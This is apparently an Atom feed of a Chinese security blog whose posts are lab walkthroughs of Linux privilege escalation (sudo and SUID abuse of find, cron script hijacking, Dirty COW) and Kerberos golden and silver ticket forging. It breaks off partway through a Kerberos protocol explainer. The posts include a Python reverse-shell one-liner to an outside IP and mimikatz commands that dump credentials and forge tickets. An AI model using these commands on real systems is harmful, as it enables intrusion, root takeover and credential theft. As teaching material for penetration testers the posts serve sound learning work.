<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iceH’s Blog</title>
  
  <subtitle>分享/干货/生活</subtitle>
  <link href="http://www.secice.cn/atom.xml" rel="self"/>
  
  <link href="http://www.secice.cn/"/>
  <updated>2020-11-27T08:47:43.996Z</updated>
  <id>http://www.secice.cn/</id>
  
  <author>
    <name>iceH</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux提权之Sudo配置错误</title>
    <link href="http://www.secice.cn/p/94404766"/>
    <id>http://www.secice.cn/p/94404766</id>
    <published>2020-11-27T06:38:09.000Z</published>
    <updated>2020-11-27T08:47:43.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。</p><p>管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。</p><p>一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>拿到普通用户权限之后，使用<code>sudo –l</code>查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。</p><pre><code class="hljs bash">sudo /usr/bin/find /home -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/01.jpg" alt="root"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之Suid提权</title>
    <link href="http://www.secice.cn/p/a20c8cf4"/>
    <id>http://www.secice.cn/p/a20c8cf4</id>
    <published>2020-11-27T05:44:54.000Z</published>
    <updated>2020-11-27T07:11:39.968Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便会以root特权执行。</p><p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p><p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p><h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">NmapVimfindBashMoreLessNanocp</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p><p>该脚本的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre><p>执行LinEnum之后，发现find这个命令有SUID权限。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" alt="收集信息"></p><h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p><pre><code class="hljs bash">touch ice/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre><p>确认 find 命令是否是 root 权限执行.</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" alt="root"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p><pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre><p>结合 find :</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" alt="非root权限"></p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p><p>我们尝试使用如下命令获取 shell：</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" alt="提权成功"></p><p>可以看到获取的 shell 为 root 权限。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之定时任务</title>
    <link href="http://www.secice.cn/p/75fd4604"/>
    <id>http://www.secice.cn/p/75fd4604</id>
    <published>2020-11-26T07:40:12.000Z</published>
    <updated>2020-11-26T12:10:19.304Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" alt="Linux提权之定时任务"></p><p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p><pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre><p>如果未正确配置Cron，则可以利用它获得root特权。</p><ol><li>cron作业中是否有可写的脚本或二进制文件？</li><li>我们可以覆盖cron文件本身吗？</li><li>cron.d目录可写吗？</li></ol><p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p><pre><code class="hljs bash">mkdir cleanup<span class="hljs-built_in">cd</span> cleanup<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.phpls</code></pre><p>下图是上面命令执行的结果：</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" alt="创建文件"></p><p>下面我们写一个python程序来删除 /home/cleanup的内容。</p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmpvi cleanup.py</code></pre><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>import osimport systry:   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)except:    sys.exit()</code></pre><p><code>chmod 777 cleanup.py</code></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" alt="创建文件"></p><p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre><p>下面是运行效果</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" alt="创建文件"></p><p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p><p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p><p>该工具的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre><p>首先将pspy上传到目标机器：</p><p>1）chmod +x pspy64s</p><p>2）./pspy64</p><p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" alt="pspy64s"></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" alt="pspy64s"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" alt="查看权限"></p><p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p><pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" alt="修改文件"></p><p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" alt="利用成功"></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" alt="root权限"></p><p>提权成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之内核漏洞</title>
    <link href="http://www.secice.cn/p/3574493e"/>
    <id>http://www.secice.cn/p/3574493e</id>
    <published>2020-11-26T03:12:42.000Z</published>
    <updated>2020-11-26T12:10:19.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。</p><p>Linux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以Linux内核提权漏洞-“脏牛”来做演示。</p><p>给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。</p><p>下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester</code></pre><p>1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> +<span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span>./<span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span></code></pre><p>在执行上述命令之前，首先查看Linux内核版本。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/01.png" alt="查看Linux内核版本"></p><p>查看脚本执行结果，可以使用脏牛来进行提权。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/02.png" alt="执行结果"></p><p>2.将漏洞利用代码上传到目标机器，接下来编译并执行。</p><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-pthread</span> <span class="hljs-selector-tag">dirty</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">-lcrypt</span>./<span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">password</span></code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/03.png" alt="编译"></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/04.png" alt="运行"></p><p>3.该漏洞利用代码会加入一个uid为0的用户，使用<code>su firefart</code>切换到firefart用户，获取root权限。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。&lt;/p&gt;</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos协议之黄金票据和白银票据</title>
    <link href="http://www.secice.cn/p/737303c7"/>
    <id>http://www.secice.cn/p/737303c7</id>
    <published>2020-11-25T03:42:55.000Z</published>
    <updated>2020-11-25T07:10:06.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h2><p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p><p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</p><h3 id="制作黄金票据的前提条件"><a href="#制作黄金票据的前提条件" class="headerlink" title="制作黄金票据的前提条件"></a>制作黄金票据的前提条件</h3><ul><li>1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f</li><li>2、域名称    secice.cn</li><li>3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595</li><li>4、要伪造的用户名(可以是任意用户甚至是不存在的用户)</li></ul><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:secice.cn /user:krbtgt//导出 krbtgt 密码 hash</span>也可以mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:secice.cn /user:krbtgt&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt<span class="hljs-regexp">//</span>将导出的信息保存在<span class="hljs-number">1</span>.txt中</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/01.png" alt="黄金票据利用"></p><p>切换到普通域用户的机器，生成TGT凭证,用户名随意:</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt</span>也可以mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&quot;</span> <span class="hljs-string">&quot;kerberos::list&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/02.png" alt="黄金票据利用"></p><blockquote><p>注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。</p></blockquote><h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h2><p>白银票据是出现在TGS_REQ &amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。</p><h3 id="伪造白银票据的前提条件"><a href="#伪造白银票据的前提条件" class="headerlink" title="伪造白银票据的前提条件"></a>伪造白银票据的前提条件</h3><ul><li>1、域名称        secice.cn</li><li>2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595</li><li>3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a</li><li>4、伪造的用户名(可以是任意的)</li></ul><p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.</p><h3 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h3><p>首先登录域控，dump机器hash</p><pre><code class="hljs awk">privilege::debugsekurlsa::logonpasswords也可以mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/03.png" alt="白银票据利用"></p><p>将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）</p><pre><code class="hljs awk">mimikatz.exe privilege::debug <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/04.png" alt="白银票据利用"></p><p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/05.png" alt="白银票据利用"></p><p>不仅仅是cifs服务还有其他：</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/06.png" alt="白银票据利用"></p><p>ldap可以用来dcsync</p><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><ol><li>访问权限不同<br>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</li><li>加密方式不同<br>Golden Ticket 由 krbtgt 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</li><li>认证流程不同<br>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Golden-Ticket-黄金票据&quot;&gt;&lt;a href=&quot;#Golden-Ticket-黄金票据&quot; class=&quot;headerlink&quot; title=&quot;Golden Ticket(黄金票据)&quot;&gt;&lt;/a&gt;Golden Ticket(黄金票据)&lt;/h2&gt;&lt;p&gt;在AS_</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://www.secice.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透之Kerberos协议</title>
    <link href="http://www.secice.cn/p/fe98a932"/>
    <id>http://www.secice.cn/p/fe98a932</id>
    <published>2020-11-23T03:42:55.000Z</published>
    <updated>2020-11-25T07:08:11.746Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kerberos-协议简介"><a href="#Kerberos-协议简介" class="headerlink" title="Kerberos 协议简介"></a>Kerberos 协议简介</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。</p><h2 id="Kerberos-协议框架"><a href="#Kerberos-协议框架" class="headerlink" title="Kerberos 协议框架"></a>Kerberos 协议框架</h2><p>Kerberos 协议中主要有三个角色:</p><ul><li>访问服务的 Client</li><li>提供服务的 Server</li><li>KDC(Key Distribution Center)密钥分发中心</li></ul><p>KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数</p><p>据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。</p><p>如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/01.png" alt="Kerberos 协议框架"></p><p>由上图可以看出，KDC 又分为两个部分:</p><blockquote><p>Authentication Server:</p></blockquote><p>AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，</p><p>验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。</p><blockquote><p>Ticket Granting Server:</p></blockquote><p>TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server</p><p>端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/02.png" alt="Kerberos 协议框架"></p><h2 id="Kerberos-认证流程"><a href="#Kerberos-认证流程" class="headerlink" title="Kerberos 认证流程"></a>Kerberos 认证流程</h2><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:</p><ul><li>The Authentication Service Exchange: Client 与 AS 的交互</li><li>The Ticket Granting Service Exchange:Client 与 TGS 的交互</li><li>The Client/Server Authentication Exchange:Client 与 Server 的交互</li></ul><p><img 